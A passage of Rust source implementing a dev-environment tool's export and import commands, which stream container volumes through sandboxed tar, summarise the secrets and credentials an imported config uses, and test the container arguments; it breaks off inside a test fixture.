//! `luoto export` and `luoto import`: an env moved to another luoto (a release and a source
//! build are separate instances in one VM, `names::instance`) or another machine, as one file
//! (`archive.rs`). Each volume streams through a container in the env's user namespace
//! (`env::dev_id_map`), so the archive holds the container's own IDs and the new volumes get
//! the new env's, whatever subnet each env has; nothing of a volume is unpacked on the host.
//! Secret values, the CA and the vault token don't move: import makes a new CA and token, and
//! the config's refs are read on this machine at `up`.

use std::collections::{BTreeMap, BTreeSet};
use std::fs::File;
use std::io::{BufReader, BufWriter, IsTerminal, Read, Write};
use std::path::{Path, PathBuf};
use std::process::{Child, ExitCode, Stdio};
use std::thread::JoinHandle;
use std::time::{Duration, Instant};

use anyhow::{Context, Result, bail};

use crate::archive::{self, Head, Manifest, Moved, Part};
use crate::config::{self, EnvConfig, EnvFile};
use crate::env::{self, Ctx};
use crate::paths::{Paths, write_private};
use crate::prompt::confirm;
use crate::runtime::Runtime;
use crate::state::{self, EnvState};
use crate::text::display;
use crate::{ca, disk, names, project, repos, workspace};

/// Where the volume is mounted in the container that reads or writes it.
const MOUNT: &str = "/v";
/// Left in the env's state folder while an import runs: one cut short is cleared by the next.
const PARTIAL: &str = "import.partial";
/// The most of tar's own messages kept.
const MAX_STDERR: usize = 64 * 1024;
/// What the config's secret refs start with (`secrets.rs`).
const REF_SCHEMES: [&str; 6] = ["op://", "vault://", "keyring:", "env:", "file:", "azcli:"];

/// A container of luoto's tools image with the volume `vol` alone, in the env's user
/// namespace (`id_map`): no network, a read-only root and only the capabilities tar needs to
/// read (or `write`) every file. Its output isn't logged: it is the volume's contents.
fn tar_args(rt: &Runtime, image: &str, vol: &str, id_map: Option<u32>, write: bool) -> Vec<String> {
    let mut a = volume_container(rt, image, vol, id_map, write);
    let tar: &[&str] = if write {
        &["tar", "-x", "--numeric-owner", "-f", "-", "-C", MOUNT]
    } else {
        &["tar", "-c", "-f", "-", "-C", MOUNT, "."]
    };
    a.extend(tar.iter().map(|s| s.to_string()));
    a
}

/// [`tar_args`]' container giving the NUL-separated paths on its input the owner
/// `uid:gid`, the links themselves (`chown -h`).
fn chown_args(
    rt: &Runtime,
    image: &str,
    vol: &str,
    id_map: Option<u32>,
    uid: u64,
    gid: u64,
) -> Vec<String> {
    let mut a = volume_container(rt, image, vol, id_map, true);
    a.extend(["xargs", "-0", "chown", "-h", &format!("{uid}:{gid}")].map(String::from));
    a
}

fn volume_container(
    rt: &Runtime,
    image: &str,
    vol: &str,
    id_map: Option<u32>,
    write: bool,
) -> Vec<String> {
    let mut a: Vec<String> = vec!["run".into(), "--rm".into()];
    if write {
        a.push("-i".into());
    }
    for f in [
        "--network",
        "none",
        "--log-driver",
        "none",
        "--read-only",
        "--security-opt",
        "no-new-privileges",
        "--cap-drop",
        "ALL",
    ] {
        a.push(f.into());
    }
    let caps: &[&str] = if write {
        &["CHOWN", "DAC_OVERRIDE", "FOWNER", "FSETID"]
    } else {
        &["DAC_READ_SEARCH"]
    };
    for c in caps {
        a.extend(["--cap-add".into(), (*c).into()]);
    }
    a.extend(rt.id_map_args(id_map));
    a.extend([
        "-v".into(),
        format!("{vol}:{MOUNT}{}", if write { "" } else { ":ro" }),
        image.into(),
    ]);
    a
}

/// tar's own messages, read as they come so it never blocks on them; the first
/// [`MAX_STDERR`] bytes are kept.
fn stderr_of(child: &mut Child) -> Option<JoinHandle<String>> {
    let mut err = child.stderr.take()?;
    Some(std::thread::spawn(move || {
        let (mut kept, mut buf) = (Vec::new(), [0u8; 8192]);
        while let Ok(n) = err.read(&mut buf) {
            if n == 0 {
                break;
            }
            let room = MAX_STDERR.saturating_sub(kept.len());
            kept.extend_from_slice(&buf[..n.min(room)]);
        }
        String::from_utf8_lossy(&kept).trim().to_string()
    }))
}

/// Whether the container succeeded, and what it said (escaped: it names the volume's files).
fn wait_tar(child: &mut Child, errs: Option<JoinHandle<String>>) -> (bool, String) {
    let ok = child.wait().is_ok_and(|s| s.success());
    let said = errs.and_then(|h| h.join().ok()).unwrap_or_default();
    (ok, crate::text::lines(&said))
}

/// Bytes moved, on a terminal as they go.
struct Progress {
    label: &'static str,
    done: u64,
    total: Option<u64>,
    shown: Option<Instant>,
    tty: bool,
}

impl Progress {
    fn new(label: &'static str, total: Option<u64>) -> Self {
        Progress {
            label,
            done: 0,
            total,
            shown: None,
            tty: std::io::stderr().is_terminal(),
        }
    }

    fn line(&self) -> String {
        match self.total {
            Some(t) => format!(
                "{}: {} of {}",
                self.label,
                disk::human(self.done),
                disk::human(t)
            ),
            None => format!("{}: {}", self.label, disk::human(self.done)),
        }
    }

    fn add(&mut self, n: u64) {
        self.done += n;
        if self.tty
            && self
                .shown
                .is_none_or(|t| t.elapsed() >= Duration::from_millis(250))
        {
            eprint!("\r{}\x1b[K", self.line());
            self.shown = Some(Instant::now());
        }
    }

    fn finish(&self) {
        if self.tty {
            eprint!("\r\x1b[K");
        }
        eprintln!("{}", self.line());
    }
}

/// The archive's path: `file`, or `<env>.luoto.tar` in it when it is a folder, or here.
fn destination(file: Option<&str>, env: &str) -> Result<PathBuf> {
    let name = format!("{env}.luoto.tar");
    let path = match file {
        None => PathBuf::from(&name),
        Some(f) => {
            let p = workspace::expand(f);
            if p.is_dir() { p.join(&name) } else { p }
        }
    };
    if path.exists() {
        bail!("{} exists: name another file", path.display());
    }
    Ok(path)
}

/// A new file only the user can read.
fn create_private(path: &Path) -> Result<File> {
    let mut opts = std::fs::OpenOptions::new();
    opts.write(true).create_new(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        opts.mode(0o600);
    }
    opts.open(path)
        .with_context(|| format!("create {}", path.display()))
}

/// The names of the runtime's volumes.
fn volumes(rt: &Runtime) -> Result<BTreeSet<String>> {
    Ok(rt
        .run(["volume", "ls", "--format", "{{.Name}}"])?
        .lines()
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty())
        .collect())
}

pub fn export(env: &str, file: Option<&str>, no_home: bool, yes: bool) -> Result<ExitCode> {
    let ctx = Ctx::load()?;
    config::validate_name(env)?;
    let cfg_path = ctx.paths.env_config(env);
    let config = std::fs::read_to_string(&cfg_path)
        .with_context(|| format!("no env `{env}` (`luoto ls` lists them)"))?;
    let Some(state) = EnvState::load(&ctx.paths, env)? else {
        bail!(
            "`{env}` was never started, so it has no workspace: its config ({}) is all there \
             is to move",
            cfg_path.display()
        );
    };
    let dest = destination(file, env)?;
    env::ensure_vm(&ctx)?;
    let vols = volumes(&ctx.rt)?;
    if !vols.contains(&names::volume(env, "work")) {
        bail!(
            "`{env}` has no workspace volume in {}",
            disk::place(&ctx.rt)
        );
    }
    let home = !no_home && vols.contains(&names::volume(env, "home"));
    let project = std::fs::read_to_string(project::snapshot_path(&ctx, env)).ok();
    let moved = Moved {
        home: state.home.clone(),
        seeded: state.seeded,
        repos: state.repos.clone(),
        public_repos: repos::declined(&ctx, env)
            .into_iter()
            .filter(|k| !k.is_empty() && k.len() <= 512 && k.bytes().all(|b| b.is_ascii_graphic()))
            .collect(),
        declined_project: std::fs::read_to_string(project::declined_path(&ctx, env))
            .ok()
            .map(|s| s.trim().to_string())
            .filter(|s| s.len() == 64 && s.bytes().all(|b| b.is_ascii_hexdigit())),
    };
    moved
        .check()
        .with_context(|| format!("`{env}` can't be exported"))?;
    let mut parts = vec![Part::Config];
    parts.extend(project.as_ref().map(|_| Part::Project));
    parts.extend([Part::State, Part::Work]);
    parts.extend(home.then_some(Part::Home));

    println!("`{env}` goes into {}:", dest.display());
    println!(
        "  config     {}{}, its repos and your answers about them",
        crate::ssh::tilde(&cfg_path),
        if project.is_some() {
            ", the accepted luoto.toml"
        } else {
            ""
        }
    );
    println!("  workspace  /workspace, all of it");
    if home {
        println!(
            "  home       {}: dotfiles, shell history, agents' logins and state, toolchains",
            state.home()
        );
    } else {
        println!(
            "  home       left out{}: the imported env starts with a new one",
            if no_home {
                " (--no-home)"
            } else {
                " (it has none)"
            }
        );
    }
    println!(
        "Not in it: secret values (the config's refs are read where it is imported), its CA \
         and vault token (import makes new ones), and what `up` rebuilds."
    );
    let states = ctx.rt.states()?;
    if states.running(&names::dev(env)) || states.running(&names::gate(env)) {
        println!(
            "\n`{env}` is running, and its files would change under the copy: it stops for the \
             export (`luoto up -e {env}` starts it again)."
        );
        if !yes && !confirm(&format!("Stop `{env}` and export it?")) {
            bail!("nothing exported (`luoto down -e {env}` first, or `--yes` stops it)");
        }
        env::down(&ctx, env)?;
        println!("env `{env}` stopped");
    }
    env::ensure_image(&ctx, &ctx.image("tools"))?;

    let manifest = Manifest::new(env, parts);
    let id_map = env::dev_id_map(&ctx.rt, state.octet);
    let tmp = dest.with_file_name(format!(
        "{}.partial",
        dest.file_name()
            .map(|n| n.to_string_lossy().into_owned())
            .unwrap_or_default()
    ));
    let written = (|| -> Result<u64> {
        let file = create_private(&tmp)?;
        let mut w = archive::Writer::new(BufWriter::with_capacity(1 << 20, file), &manifest)?;
        w.file(Part::Config, config.as_bytes())?;
        if let Some(p) = &project {
            w.file(Part::Project, p.as_bytes())?;
        }
        w.file(Part::State, &serde_json::to_vec_pretty(&moved)?)?;
        for part in manifest.parts.iter().copied() {
            if part.volume().is_some() {
                read_volume(&ctx, env, part, id_map, &mut w)?;
            }
        }
        let file = w.finish()?.into_inner().map_err(|e| e.into_error())?;
        file.sync_all()?;
        Ok(file.metadata()?.len())
    })();
    let size = match written {
        Ok(n) => n,
        Err(e) => {
            let _ = std::fs::remove_file(&tmp);
            return Err(e);
        }
    };
    std::fs::rename(&tmp, &dest).with_context(|| format!("write {}", dest.display()))?;
    println!(
        "\nwrote {} ({}): `luoto import {}` makes the env in another luoto, here or on \
         another machine.\nIt holds the env's workspace and home, agents' logins included: keep \
         it as you would a secret.",
        dest.display(),
        disk::human(size),
        dest.file_name()
            .map(|n| n.to_string_lossy().into_owned())
            .unwrap_or_default()
    );
    Ok(ExitCode::SUCCESS)
}

/// `part`'s volume of `env` into the archive, through `tar -c` in a container.
fn read_volume<W: Write>(
    ctx: &Ctx,
    env: &str,
    part: Part,
    id_map: Option<u32>,
    w: &mut archive::Writer<W>,
) -> Result<()> {
    let vol = names::volume(env, part.volume().unwrap_or_default());
    let mut child = ctx
        .rt
        .command()
        .args(tar_args(&ctx.rt, &ctx.image("tools"), &vol, id_map, false))
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .context("start tar in a container")?;
    let errs = stderr_of(&mut child);
    let out = child.stdout.take().context("tar's output")?;
    let mut progress = Progress::new(part.label(), None);
    // The stream is dropped at the end, also on an error, which ends the container's tar.
    let copied = w.volume(part, BufReader::with_capacity(1 << 20, out), &mut |n| {
        progress.add(n)
    });
    progress.finish();
    let (ok, said) = wait_tar(&mut child, errs);
    let what = format!("reading the {} volume", part.label());
    copied.with_context(|| {
        format!(
            "{what}{}",
            if said.is_empty() {
                String::new()
            } else {
                format!(" (tar: {said})")
            }
        )
    })?;
    if !ok {
        bail!("{what} failed: {said}");
    }
    if !said.is_empty() {
        eprintln!("note: tar, {what}: {said}");
    }
    Ok(())
}

/// Each volume's stream unpacked into a new volume of `env` by `tar -x` in a container in its
/// user namespace.
struct Extract<'a> {
    ctx: &'a Ctx,
    env: &'a str,
    id_map: Option<u32>,
    running: Option<(Child, Option<JoinHandle<String>>)>,
}

impl Extract<'_> {
    fn wait(&mut self) -> (bool, String) {
        match self.running.take() {
            Some((mut child, errs)) => wait_tar(&mut child, errs),
            None => (true, String::new()),
        }
    }
}

impl archive::Sink for Extract<'_> {
    fn open(&mut self, part: Part) -> Result<Box<dyn Write>> {
        let what = part.volume().context("not a volume")?;
        if !env::create_volume(self.ctx, self.env, what)? {
            bail!("{} exists already", names::volume(self.env, what));
        }
        let vol = names::volume(self.env, what);
        let mut child = self
            .ctx
            .rt
            .command()
            .args(tar_args(
                &self.ctx.rt,
                &self.ctx.image("tools"),
                &vol,
                self.id_map,
                true,
            ))
            .stdin(Stdio::piped())
            .stdout(Stdio::null())
            .stderr(Stdio::piped())
            .spawn()
            .context("start tar in a container")?;
        let stdin = child.stdin.take().context("tar's input")?;
        let errs = stderr_of(&mut child);
        self.running = Some((child, errs));
        Ok(Box::new(BufWriter::with_capacity(1 << 20, stdin)))
    }

    fn close(&mut self, part: Part, w: Box<dyn Write>, links: &[archive::LinkOwner]) -> Result<()> {
        // Its end of input: tar finishes.
        drop(w);
        let (ok, said) = self.wait();
        if !ok {
            bail!("writing the {} volume failed: {said}", part.label());
        }
        if !said.is_empty() {
            eprintln!("note: tar, writing the {}: {said}", part.label());
        }
        let what = part.volume().context("not a volume")?;
        let vol = names::volume(self.env, what);
        // One container per owner, nearly always the dev user's alone.
        let mut by_owner: BTreeMap<(u64, u64), Vec<u8>> = BTreeMap::new();
        for l in links {
            let paths = by_owner.entry((l.uid, l.gid)).or_default();
            paths.extend_from_slice(format!("{MOUNT}/").as_bytes());
            paths.extend_from_slice(l.name.strip_prefix(b"./").unwrap_or(&l.name));
            paths.push(0);
        }
        for ((uid, gid), paths) in by_owner {
            let args = chown_args(
                &self.ctx.rt,
                &self.ctx.image("tools"),
                &vol,
                self.id_map,
                uid,
                gid,
            );
            let out = self.ctx.rt.run_stdin(args, &paths);
            if let Err(e) = out {
                eprintln!(
                    "note: the {}'s links keep root as their owner ({e:#})",
                    part.label()
                );
            }
        }
        Ok(())
    }
}

/// Each string in the config's credentials and sandbox secrets that is a secret ref, with its
/// key: what `up` reads on this machine.
fn secret_refs(text: &str) -> Vec<(String, String)> {
    fn walk(v: &toml::Value, at: String, out: &mut Vec<(String, String)>) {
        match v {
            toml::Value::String(s) if REF_SCHEMES.iter().any(|p| s.starts_with(p)) => {
                out.push((at, s.clone()));
            }
            toml::Value::Table(t) => {
                for (k, v) in t {
                    walk(v, format!("{at}.{k}"), out);
                }
            }
            toml::Value::Array(a) => {
                for (i, v) in a.iter().enumerate() {
                    walk(v, format!("{at}[{i}]"), out);
                }
            }
            _ => {}
        }
    }
    let mut out = Vec::new();
    if let Ok(t) = toml::from_str::<toml::Table>(text) {
        for key in ["credentials", "sandbox_secrets", "model_servers"] {
            if let Some(v) = t.get(key) {
                walk(v, key.to_string(), &mut out);
            }
        }
    }
    out.sort();
    out
}

/// What to say of the keychain entries the config's refs name, which don't move with it.
fn keychain_note(text: &str, env: &str) -> Option<String> {
    let mut refs: Vec<String> = Vec::new();
    for svc in [names::instance(), names::other_instance()] {
        refs.extend(
            crate::uninstall::keyring_accounts(text, svc)
                .into_iter()
                .map(|a| display(&format!("keyring:{svc}/{a}"))),
        );
    }
    let other = format!("keyring:{}/", names::other_instance());
    let others = refs.iter().any(|r| r.starts_with(&other));
    if refs.is_empty() && !text.contains("keyring:") {
        return None;
    }
    let mut note = format!(
        "keychain entries don't move with the archive{}.\n      From this machine they work as \
         long as they exist",
        if refs.is_empty() {
            String::new()
        } else {
            format!(", and the config reads {}", refs.join(", "))
        }
    );
    if others {
        note.push_str(&format!(
            " (`{} uninstall` removes {}'s)",
            names::other_instance(),
            names::other_instance()
        ));
    }
    note.push_str(&format!(
        "; from another, store them again here.\n      To keep a secret with this luoto, delete \
         its credential (`luoto edit -e {env}`) and `luoto up -e {env}` asks for it, or point \
         its ref elsewhere."
    ));
    Some(note)
}

/// Each credential of `cfg` with the hosts the gate adds it on (`compile`'s injections), or
/// the hosts its key logs in to. Its git CAs aren't read for it: they are files named by the
/// config, which nothing looks up before the yes.
fn credential_hosts(name: &str, cfg: &EnvConfig) -> Result<Vec<(String, String)>> {
    let mut cfg = cfg.clone();
    for g in &mut cfg.credentials.git {
        g.ca = None;
    }
    let c = crate::compile::compile(name, &cfg, None, &[])?;
    Ok(c.bindings
        .iter()
        .map(|(binding, spec)| {
            let mut hosts: Vec<String> = Vec::new();
            for i in c.policy.injections.iter().filter(|i| &i.binding == binding) {
                config::extend_unique(&mut hosts, [display(&i.host)]);
            }
            let to = match spec {
                luoto_shared::creds::BindingSpec::SshAgent { .. } => format!(
                    "logs in to {}",
                    cfg.credentials
                        .ssh
                        .iter()
                        .flat_map(|s| s.hosts.iter().map(|h| display(h)))
                        .collect::<Vec<_>>()
                        .join(", ")
                ),
                _ if hosts.is_empty() => "no host".to_string(),
                _ => hosts.join(", "),
            };
            (display(binding), to)
        })
        .collect())
}

/// What the archive is and what importing it as `name` opens on this machine: its folders
/// as written (nothing here looks them up before the yes), the secrets `up` reads and where
/// each credential goes, and what of the config reaches past the gate.
fn summary(path: &Path, head: &Head, name: &str, cfg: &EnvConfig) -> Vec<String> {
    let m = &head.manifest;
    let mut out = vec![format!(
        "{}: env `{}`, exported by {} {} at {}",
        path.display(),
        display(&m.env),
        display(&m.instance),
        display(&m.luoto),
        display(&m.created)
    )];
    let mut line = |label: &str, value: String| out.push(format!("  {label:<10} {value}"));
    let parts: Vec<&str> = m.parts.iter().map(|p| p.label()).collect();
    line("holds", parts.join(", "));
    if !m.parts.contains(&Part::Home) {
        line(
            "home",
            "not in it: `up` makes a new one, and installs agents and toolchains".into(),
        );
    }
    let ws = &cfg.workspace;
    match (&ws.dir, &ws.url) {
        (Some(d), _) => line(
            "folder",
            format!(
                "{}: `luoto pull` writes the workspace's files here",
                display(d)
            ),
        ),
        (None, Some(u)) => line("remote", display(u)),
        _ => {}
    }
    for (n, r) in &ws.repos {
        match (&r.dir, &r.url) {
            (Some(d), _) => line(
                "repo",
                format!(
                    "{}: {}, where `luoto pull` writes its files",
                    display(n),
                    display(d)
                ),
            ),
            (None, Some(u)) => line(
                "repo",
                format!("{}: cloned from {}", display(n), display(u)),
            ),
            _ => {}
        }
    }
    let refs = secret_refs(&head.config);
    let az = cfg
        .credentials
        .azure
        .as_ref()
        .is_some_and(|a| a.client_secret.is_none());
    if refs.is_empty() && !az {
        line("secrets", "none".into());
    } else {
        line("secrets", "read on this machine at `up`, from:".into());
        for (key, r) in &refs {
            line(
                "",
                format!("{} = {}", display(key), crate::secrets::shown_ref(r)),
            );
        }
        if az {
            line("", "credentials.azure: your `az` login here".into());
        }
    }
    match credential_hosts(name, cfg) {
        Ok(creds) if creds.is_empty() => {}
        Ok(creds) => {
            line("sent to", "each credential, by the gate, on:".into());
            let width = creds.iter().map(|(b, _)| b.len()).max().unwrap_or(0);
            for (b, to) in creds {
                line("", format!("{b:<width$}  {to}"));
            }
        }
        Err(e) => line(
            "sent to",
            format!(
                "not listed: the config doesn't compile here ({})",
                display(&format!("{e:#}"))
            ),
        ),
    }
    for k in cfg.sandbox_secrets.keys() {
        line(
            "in sandbox",
            format!(
                "{}: the secret itself, readable by any code in the env",
                display(k)
            ),
        );
    }
    for g in &cfg.credentials.git {
        if g.private {
            line(
                "git",
                format!(
                    "{}: the gate dials its private addresses (`private = true`)",
                    display(&g.host)
                ),
            );
        }
        if let Some(ca) = &g.ca {
            line(
                "git",
                format!(
                    "{}: trusts the CA in {} (read at `up`)",
                    display(&g.host),
                    display(ca)
                ),
            );
        }
    }
    for (n, s) in &cfg.model_servers {
        let place = match crate::model_servers::Endpoint::parse(&s.url) {
            Ok(ep) if ep.this_machine() => "on this machine: the env reaches its model API",
            Ok(ep) if ep.private_address() || s.private => "on a private network",
            Ok(_) => "on the internet",
            Err(_) => "not a valid address",
        };
        let token = if s.token.is_some() {
            ", with its token"
        } else {
            ""
        };
        line(
            "model",
            format!("{} at {} ({place}{token})", display(n), display(&s.url)),
        );
    }
    match cfg.isolation {
        Some(config::Isolation::Container) => line(
            "isolation",
            "CONTAINER: no gVisor, the VM's kernel is the boundary".into(),
        ),
        Some(config::Isolation::Gvisor) => line("isolation", "gVisor".into()),
        None => {}
    }
    if let Some(r) = &cfg.resources.oci_runtime {
        line(
            "runtime",
            format!("{} (runs the dev container)", display(r)),
        );
    }
    if let Some(i) = &cfg.image {
        line(
            "image",
            format!("{} (pulled outside the gate; the env runs it)", display(i)),
        );
    }
    for p in &cfg.ports {
        line(
            "ports",
            format!("{p} (published on 127.0.0.1 on this machine)"),
        );
    }
    match cfg.egress.open_at(chrono::Utc::now()) {
        Ok(None) => {}
        Ok(Some(until)) => line(
            "egress",
            format!(
                "OPEN {}: any HTTP(S) host no rule allows (`luoto egress close` ends it)",
                crate::egress::until_text(until)
            ),
        ),
        Err(e) => line("egress", display(&format!("{e:#}"))),
    }
    for r in &cfg.allow {
        line("allow", project::rule_line(r));
    }
    for c in &cfg.deps.run {
        line(
            "run",
            format!("`{}` (a command the env runs on `up`)", display(c)),
        );
    }
    if head.project.is_some() {
        line(
            "luoto.toml",
            "accepted where it was exported, not here: `up` reviews the workspace's as a new one"
                .into(),
        );
    }
    line(
        "becomes",
        format!(
            "env `{name}` of {}, with a CA and vault token of its own",
            names::instance()
        ),
    );
    out
}

/// Clear what an import of `name` cut short left; refuse a name something else holds.
fn clear_leftovers(ctx: &Ctx, name: &str) -> Result<()> {
    let dir = ctx.paths.env_state(name);
    if dir.join(PARTIAL).exists() {
        eprintln!("note: an import of `{name}` was cut short here; what it left is removed");
        env::remove(ctx, name)?;
    } else if dir.exists() {
        bail!(
            "`{name}` has state here ({}) but no config: remove that folder, or `--name` \
             another name",
            dir.display()
        );
    }
    let vols = volumes(&ctx.rt)?;
    if let Some(v) = ["work", "home", "tools", "gate"]
        .map(|w| names::volume(name, w))
        .into_iter()
        .find(|v| vols.contains(v))
    {
        bail!(
            "{} has a volume of an env `{name}` this luoto doesn't have ({v}): `--name` imports \
             it under another name",
            disk::place(&ctx.rt)
        );
    }
    Ok(())
}

/// The imported env's state on subnet `octet`, with a vault token of its own. Its workspace
/// and every folder repo count as copied in: their contents came in the archive, and `up`
/// copies nothing from this machine's folders into an env the archive made.
fn imported_state(octet: u8, m: &Moved, cfg: &EnvConfig) -> EnvState {
    let folders = cfg
        .workspace
        .repos
        .iter()
        .filter(|(_, r)| r.dir.is_some())
        .map(|(n, _)| n.clone());
    // Its home holds what the agents' configs had of the model servers: as written for this
    // config, so a server removed here takes its entries along.
    let agent_servers = cfg
        .agents
        .0
        .iter()
        .filter_map(|(n, o)| {
            let a = luoto_shared::profiles::agent(n)?;
            let (_, w) = crate::agents::settings(&a, o, cfg, &Default::default());
            (!w.is_empty()).then(|| (n.clone(), w))
        })
        .collect();
    EnvState {
        seeded: m.seeded || cfg.workspace.dir.is_some(),
        repos: m.repos.iter().cloned().chain(folders).collect(),
        agent_servers,
        ..EnvState::fresh(octet, m.home.clone())
    }
}

/// The rest of the imported env, once its volumes are written: its answers about repos, a new
/// CA, then the config, with which the env exists. Not the luoto.toml accepted where it was
/// exported: `up` reviews the workspace's as a new one.
fn settle(ctx: &Ctx, name: &str, head: &Head, config: &str) -> Result<()> {
    let m = &head.state;
    if let Some(d) = &m.declined_project {
        write_private(&project::declined_path(ctx, name), d.as_bytes())?;
    }
    if !m.public_repos.is_empty() {
        let text: String = m.public_repos.iter().map(|k| format!("{k}\n")).collect();
        write_private(&repos::declined_path(ctx, name), text.as_bytes())?;
    }
    ca::ensure(&ctx.paths.env_state(name), name)?;
    std::fs::create_dir_all(ctx.paths.envs_dir())?;
    let path = ctx.paths.env_config(name);
    std::fs::write(&path, config).with_context(|| format!("write {}", path.display()))
}

pub fn import(file: &str, name: Option<&str>, yes: bool) -> Result<ExitCode> {
    let ctx = Ctx::load()?;
    let path = workspace::expand(file);
    let f = File::open(&path).with_context(|| format!("open {}", path.display()))?;
    let total = f.metadata()?.len();
    let mut tar = tar::Archive::new(BufReader::with_capacity(1 << 20, f));
    let mut dec = archive::Decoder::new(&mut tar)?;
    let head = archive::read_head(&mut dec).with_context(|| path.display().to_string())?;
    let name = name.unwrap_or(&head.manifest.env).to_string();
    config::validate_name(&name)?;
    let cfg_path = ctx.paths.env_config(&name);
    if cfg_path.exists() {
        bail!("env `{name}` exists here: `--name` imports it under another name");
    }
    // In the current format; an older one is upgraded as it is read.
    let cfg = EnvFile::parse(cfg_path.clone(), &head.config).context("its config")?;
    // Its folders are text until the yes: nothing here looks one up.
    repos::check(&cfg.cfg.workspace).context("its config")?;
    repos::check_folders_text(&cfg.cfg.workspace).context("its config")?;
    for line in summary(&path, &head, &name, &cfg.cfg) {
        println!("{line}");
    }
    if !yes && !confirm(&format!("Import it as `{name}`?")) {
        bail!("nothing imported (`--yes` imports without asking)");
    }
    env::ensure_vm(&ctx)?;
    clear_leftovers(&ctx, &name)?;
    if let Ok(Some(s)) = disk::space(&ctx.rt)
        && s.free < total
    {
        bail!(
            "{} has {} free, and the archive holds about {}: `luoto prune` frees some",
            disk::place(&ctx.rt),
            disk::human(s.free),
            disk::human(total)
        );
    }
    env::ensure_image(&ctx, &ctx.image("tools"))?;
    let dir = ctx.paths.env_state(&name);
    write_private(&dir.join(PARTIAL), path.display().to_string().as_bytes())?;
    // The octet is the env's from here: its state holds it while the volumes are written.
    let octet = match state::reserve(&ctx, &name, |o| imported_state(o, &head.state, &cfg.cfg)) {
        Ok(s) => s.octet,
        Err(e) => {
            let _ = env::remove(&ctx, &name);
            return Err(e);
        }
    };
    let mut sink = Extract {
        ctx: &ctx,
        env: &name,
        id_map: env::dev_id_map(&ctx.rt, octet),
        running: None,
    };
    let mut progress = Progress::new("importing", Some(total));
    let read = archive::read_volumes(&mut dec, &head.manifest, &mut sink, &mut |n| {
        progress.add(n)
    });
    progress.finish();
    let done = read.and_then(|()| settle(&ctx, &name, &head, &cfg.doc.to_string()));
    if let Err(e) = done {
        // Its input is closed: the container ends, and its volume can go.
        sink.wait();
        let _ = std::fs::remove_file(&cfg_path);
        return Err(match env::remove(&ctx, &name) {
            Ok(()) => e,
            Err(c) => e.context(format!(
                "what the import wrote wasn't all removed ({c:#}); the next `luoto import` of \
                 `{name}` clears it"
            )),
        });
    }
    std::fs::remove_file(dir.join(PARTIAL))?;
    println!(
        "env `{name}` imported (subnet {})",
        names::addrs(octet).subnet
    );
    for n in notes(&ctx, &name, &head, &cfg.cfg) {
        println!("note: {n}");
    }
    println!("`luoto up -e {name}` starts it, and asks for what it needs here");
    Ok(ExitCode::SUCCESS)
}

/// What the user should know of the imported env on this machine.
fn notes(ctx: &Ctx, name: &str, head: &Head, cfg: &EnvConfig) -> Vec<String> {
    let mut out = Vec::new();
    let ws = &cfg.workspace;
    if let Some(d) = &ws.dir {
        match workspace::canonical(d) {
            Err(_) => out.push(format!(
                "its folder {} isn't on this machine. The workspace came in the archive, so the \
                 env works without it; `luoto pull` needs `--to` until `[workspace] dir` names \
                 one here (`luoto edit -e {name}`)",
                display(d)
            )),
            Ok(dir) => {
                let shared: Vec<String> = config::list_envs(&ctx.paths)
                    .unwrap_or_default()
                    .into_iter()
                    .filter(|e| e != name)
                    .filter(|e| {
                        EnvFile::load(&ctx.paths, e).is_ok_and(|f| {
                            f.cfg
                                .workspace
                                .dir
                                .as_deref()
                                .and_then(|d| workspace::canonical(d).ok())
                                == Some(dir.clone())
                        })
                    })
                    .collect();
                if !shared.is_empty() {
                    out.push(format!(
                        "{} has the same folder: in it, commands act on one of them; `-e` \
                         picks",
                        shared
                            .iter()
                            .map(|e| format!("`{e}`"))
                            .collect::<Vec<_>>()
                            .join(", ")
                    ));
                }
            }
        }
    }
    let missing: Vec<String> = ws
        .repos
        .iter()
        .filter_map(|(n, r)| Some((n, r.dir.as_deref()?)))
        .filter(|(_, d)| workspace::canonical(d).is_err())
        .map(|(n, d)| format!("{} ({})", display(n), display(d)))
        .collect();
    if !missing.is_empty() {
        out.push(format!(
            "repo folders not on this machine: {}; their copies came in the archive",
            missing.join(", ")
        ));
    }
    if let Some(n) = keychain_note(&head.config, name) {
        out.push(n);
    }
    let m = &head.manifest;
    if m.instance == names::other_instance()
        && Paths::of(names::other_instance()).is_ok_and(|p| p.env_config(&m.env).exists())
    {
        out.push(format!(
            "{} still has `{}`: `{} rm -e {}` removes it once this one works",
            m.instance, m.env, m.instance, m.env
        ));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::runtime::Flavor;

    fn rt(flavor: Flavor) -> Runtime {
        Runtime {
            bin: "podman".into(),
            flavor,
            connection: Some("luoto".into()),
            api: None,
        }
    }

    #[test]
    fn volumes_stream_through_a_container_in_the_envs_user_namespace() {
        let start = crate::machine::dev_id_start(7);
        let read = tar_args(
            &rt(Flavor::Podman),
            "img",
            "luoto-web-work",
            Some(start),
            false,
        );
        let read = read.join(" ");
        assert!(read.starts_with("run --rm --network none --log-driver none --read-only"));
        assert!(read.contains(&format!(
            "--uidmap 0:{start}:65536 --gidmap 0:{start}:65536"
        )));
        assert!(read.contains("--cap-drop ALL --cap-add DAC_READ_SEARCH -"));
        assert!(read.ends_with("-v luoto-web-work:/v:ro img tar -c -f - -C /v ."));
        assert!(!read.contains(" -i "));

        let write = tar_args(
            &rt(Flavor::Podman),
            "img",
            "luoto-web-home",
            Some(start),
            true,
        );
        let write = write.join(" ");
        assert!(write.starts_with("run --rm -i --network none"));
        assert!(write.contains("--cap-add CHOWN --cap-add DAC_OVERRIDE --cap-add FOWNER"));
        assert!(write.contains(&format!("--uidmap 0:{start}:65536")));
        assert!(write.ends_with("-v luoto-web-home:/v img tar -x --numeric-owner -f - -C /v"));

        // Docker's dev containers have no ID map of luoto's, nor do these.
        let docker = tar_args(&rt(Flavor::Docker), "img", "v", Some(start), true).join(" ");
        assert!(!docker.contains("--uidmap"));
        // Each octet its own range, as the dev container's.
        assert_ne!(
            crate::machine::dev_id_start(7),
            crate::machine::dev_id_start(8)
        );
    }

    #[test]
    fn secret_refs_are_listed_with_their_keys() {
        let text = r#"
            presets = ["npm"]
            [env]
            NOT_A_SECRET = "file:/etc/hosts"
            [credentials.anthropic]
            oauth_token = "op://Dev/claude/token"
            [[credentials.github]]
            token = "keyring:luoto-dev/github"
            repos = ["acme/web"]
            [credentials.custom.api]
            hosts = ["api.example.com"]
